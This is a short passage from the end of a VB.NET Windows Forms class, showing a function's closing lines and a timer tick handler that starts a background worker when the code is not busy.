        End Try
        Return result
    End Function


    Private Sub Timer2_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer2.Tick
        If busyworking2 = False Then
            Timer1.Stop()
            StartWorker2()
        End If
    End Sub
End Class
